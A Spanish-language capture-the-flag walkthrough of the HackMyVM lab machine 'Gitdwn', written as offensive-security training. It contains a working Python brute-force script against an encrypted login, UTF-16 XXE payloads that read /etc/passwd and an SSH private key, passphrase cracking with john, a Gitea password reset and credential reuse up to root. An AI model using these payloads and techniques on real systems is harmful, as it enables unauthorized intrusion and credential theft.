# 🖥️ Gitdwn - HackMyVM

> **Dificultad:** Intermediate  
> **OS:** Debian  
> **IP:** 192.168.0.16  
> **Fecha:** 2026-04-14

---

## 📡 Reconocimiento

```bash
sudo arp-scan -l
sudo nmap -p- -sS -sC -sV --min-rate 5000 -n -Pn 192.168.0.16
```

**Puertos abiertos:**
| Puerto | Servicio | Versión |
|--------|----------|---------|
| 22/tcp | SSH | OpenSSH 8.4p1 Debian |
| 80/tcp | HTTP | Apache 2.4.62 |

---

## 🌐 Enumeración Web

```bash
gobuster dir -u http://192.168.0.16 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html
```

**Resultados:**
- `/dashboard.html` — panel de admin (accesible sin auth)
- `/api/` — directory listing con `login.php` e `import.php`
- `/libs/` — librerías JS: `crypto-js.min.js`, `jsencrypt.min.js`

---

## 🔐 Análisis del mecanismo de login

El archivo `login.js` revela un sistema de cifrado híbrido:

1. Credenciales cifradas con **AES-128-CBC**
2. Clave AES e IV cifrados con **RSA (PKCS1-v1_5)**
3. Payload enviado a `/api/login.php`

Herramientas estándar como Hydra no pueden atacar este endpoint — hay que replicar el cifrado en Python.

**Script de fuerza bruta:**

```python
import requests, json, base64
from Crypto.Cipher import AES, PKCS1_v1_5
from Crypto.PublicKey import RSA
from Crypto.Random import get_random_bytes
from Crypto.Util.Padding import pad

RSA_PUBLIC_KEY = """-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAt6l3k43vuI+8ODHhr07q
...
-----END PUBLIC KEY-----"""

def try_login(username, password):
    aes_key = get_random_bytes(16)
    iv = get_random_bytes(16)
    credentials = json.dumps({"username": username, "password": password}).encode()
    cipher_aes = AES.new(aes_key, AES.MODE_CBC, iv)
    encrypted_data = base64.b64encode(cipher_aes.encrypt(pad(credentials, 16))).decode()
    rsa_key = RSA.import_key(RSA_PUBLIC_KEY)
    cipher_rsa = PKCS1_v1_5.new(rsa_key)
    encrypted_key = base64.b64encode(cipher_rsa.encrypt(base64.b64encode(aes_key))).decode()
    encrypted_iv = base64.b64encode(cipher_rsa.encrypt(base64.b64encode(iv))).decode()
    r = requests.post("http://192.168.0.16/api/login.php",
        json={"encryptedData": encrypted_data, "encryptedKey": encrypted_key, "encryptedIv": encrypted_iv})
    return r.json()

with open("/usr/share/wordlists/rockyou.txt", "r", encoding="latin-1") as f:
    for line in f:
        pwd = line.strip()
        result = try_login("admin", pwd)
        if result.get("success"):
            print(f"[+] ENCONTRADO: admin:{pwd}")
            break
```

**Credenciales:** `admin / hotdog`

---

## 💉 XXE — XML External Entity Injection

El dashboard permite subir archivos XML a `/api/import.php`. El servidor filtra payloads XXE estándar (UTF-8) devolviendo `"not this way, sir"`.

### Bypass con UTF-16

El filtro no detecta las entidades peligrosas cuando el XML viene en UTF-16, pero el parser PHP sí lo procesa:

```python
payload = '''<?xml version="1.0" encoding="UTF-16"?>
<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root><data>&xxe;</data></root>'''

with open('xxe_utf16.xml', 'w', encoding='utf-16') as f:
    f.write(payload)
```

**Usuarios con shell encontrados en `/etc/passwd`:**
- `git` (uid 1001)
- `bilir` (uid 1002)

### Extracción de clave SSH privada

```python
payload = '''<?xml version="1.0" encoding="UTF-16"?>
<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///home/git/.ssh/id_ed25519">]>
<root><data>&xxe;</data></root>'''
```

> ⭐ La clave es **ed25519**, no rsa — importante usar el nombre correcto

---

## 🔑 Acceso inicial — usuario git

La clave ed25519 está protegida con passphrase. Crackeamos con john:

```bash
ssh2john id_ed25519 > hash_ed25519
john hash_ed25519 --wordlist=/usr/share/wordlists/rockyou.txt
# Passphrase: logitech
```

```bash
# Quitar passphrase para facilitar el tunnel
cp id_ed25519 id_nopass
ssh-keygen -p -P "logitech" -N "" -f id_nopass

ssh -i id_nopass git@192.168.0.16
```

**Flag user:**
```
flag{user-8727fc2a5b261f82905333ed0936025b}
```

---

## 🔍 Descubrimiento de servicio interno — Gitea

```bash
ss -tlnp | grep 3000
# gitea corriendo en 127.0.0.1:3000
```

**Port forwarding SSH para acceder desde Kali:**

```bash
ssh -4 -i id_nopass -L 7000:127.0.0.1:3000 git@192.168.0.16 -fN
```

Gitea accesible en `http://127.0.0.1:7000`

---

## 🔓 Extracción de credenciales — Webhook de Gitea

Gitea usa SQLite. Leemos la base de datos y usamos la CLI para resetear la contraseña de root:

```bash
# Localizar config
cat /etc/gitea/app.ini
# DB: /var/lib/gitea/data/gitea.db

# Resetear contraseña de root
/usr/local/bin/gitea admin user change-password --username root \
  --password newpass123 --must-change-password=false -c /etc/gitea/app.ini
```

Accedemos al webhook del repositorio Snake via API:

```bash
curl -u root:newpass123 http://127.0.0.1:7000/api/v1/repos/root/Snake/hooks
# authorization_header: "Bearer YmlsaXIhQCM="

echo YmlsaXIhQCM= | base64 -d
# bilir!@#
```

---

## ↔️ Movimiento lateral — usuario bilir

```bash
su bilir
# password: bilir!@#

cd ~/code
git stash list
# stash@{0}: On master: temp

git show stash@{0}
# pass: mazesec123123
```

El stash contiene credenciales de base de datos hardcodeadas en `config.yaml`.

---

## ⬆️ Escalada de privilegios — root

Reutilización de credenciales:

```bash
su root
# password: mazesec123123

cat /root/root.txt
```

**Flag root:**
```
flag{root-b87b0437b49b9ac088675c71de261e09}
```

---

## 📝 Lecciones aprendidas

- ⭐ **Cifrado client-side no es seguridad** — si el cliente cifra, se puede replicar el proceso y hacer fuerza bruta igualmente
- ⭐ **UTF-16 bypasea filtros XXE** — el parser XML procesa el encoding pero los filtros de seguridad no
- **Servicios internos** — siempre enumerar con `ss -tlnp` tras obtener acceso inicial
- **Gitea SQLite** — la base de datos es accesible localmente y permite resetear contraseñas via CLI
- **Webhooks** con tokens en Base64 — revisar siempre la configuración de webhooks en repositorios
- **Git stash** — puede contener credenciales temporales que los desarrolladores olvidaron eliminar
- **Reutilización de contraseñas** — la contraseña de la DB también era la de root
- Escalada en 4 pasos: `www-data → git → bilir → root`
